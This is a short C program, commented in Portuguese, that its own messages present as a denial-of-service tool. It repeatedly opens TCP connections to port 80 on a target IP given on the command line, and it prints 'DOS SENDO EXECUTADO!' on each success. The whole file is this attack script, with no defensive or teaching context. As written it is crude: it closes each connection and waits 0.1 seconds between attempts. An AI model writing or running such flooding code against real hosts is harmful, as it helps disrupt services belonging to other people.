#include <stdio.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    int meuSocket;
    int conexao;

    char *destino = argv[1];
    int porta = 80;

    struct sockaddr_in alvo;

    while (1) {
        meuSocket = socket(AF_INET, SOCK_STREAM, 0);
        alvo.sin_family = AF_INET;
        alvo.sin_addr.s_addr = inet_addr(destino);
        alvo.sin_port = htons(porta);

        conexao = connect(meuSocket, (struct sockaddr *)&alvo, sizeof(alvo));

        if (conexao == 0) {
            printf("DOS SENDO EXECUTADO!\n");
        } else {
            printf("FALHA AO CONECTAR! DOS FINALIZADO\n");
            break; // sai do loop se não conseguir conectar
        }

        close(meuSocket); // libera recurso local
        usleep(100000);   // espera 0.1 segundo
    }

    return 0;
}
